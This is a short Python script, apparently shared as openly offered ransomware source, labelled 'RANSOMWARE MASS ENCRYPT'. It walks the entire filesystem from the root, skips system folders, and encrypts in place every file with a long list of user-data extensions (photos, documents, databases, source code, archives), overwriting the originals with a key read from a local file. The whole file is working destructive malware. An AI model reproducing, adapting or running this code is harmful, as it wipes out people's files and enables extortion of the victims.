#!/usr/bin/env python3

from cryptography.fernet import Fernet #pip install cryptography
from contextlib import suppress
import os, sys

# RANSOMWARE MASS ENCRYPT
# Made By FDc0d3


class Ransom:
	def __init__(self):
		try:
			with open("Key", 'rb') as f:
				self._key = f.read() 	#Fernet.generate_key()
		except:
			sys.exit("[!] KEY NOT FOUND")
		self._logs = "logs"
		self._path = self._logs+"/path.txt"
		self._count = 0

		self._DIRECTORY = (	'/usr', #Mac/Linux
		'/Library/',
		'/System',
		'/Applications',
		'.Trash',
		#Windows
		'Program Files',
		'Program Files (x86)',
		'Windows',
		'$Recycle.Bin',
		'AppData',
		'logs',
		)

		self._EXTENSIONS = (
		'.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
		'.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
		'.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
	
		'.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
		'.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
		'.yml', '.yaml', '.json', '.xml', '.csv', # structured data
		'.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
	
		'.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
		'.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
		'.java', '.class', '.jar', # java source code
		'.ps', '.bat', '.vb', '.vbs' # windows based scripts
		'.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
		'.go', '.py', '.pyc', '.bf', '.coffee', # other source code files
	
		'.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
		)
	
	def Make_dir(self):
		with suppress(Exception):
			os.mkdir(self._logs)

	def FindFiles(self):
		with open(self._path, 'w') as f:
			for root, dirs, files in os.walk("/"):
				if any(s in root for s in self._DIRECTORY):
					pass
				else:
					for file in files:
						if file.endswith(self._EXTENSIONS):
							TARGET = os.path.join(root, file)
							f.write(TARGET+'\n')
							print(f"[ENCRYPTED] {root}")

	def Encrypt(self, filename):
		F = Fernet(self._key)
		with open(filename, "rb") as file:
			data = file.read()
		encrypted = F.encrypt(data)
		with open(filename, "wb") as file:
			file.write(encrypted)

	def Start(self):
		with suppress(FileNotFoundError):
			self.FindFiles()
			filepath = self._path
			with open(filepath) as fp:
				line = fp.readline()
				while line:
					self._count += 1
					filename = line.strip()
					with suppress(Exception):
						self.Encrypt(filename)
					print(f"[{self._count}] Permission denied!")
					line = fp.readline()
			print("\n[!] ALL FILES HAVE BEEN ENCRYPTED!\n")


if __name__ == '__main__':
	ransom = Ransom()
	ransom.Make_dir()
	ransom.Start()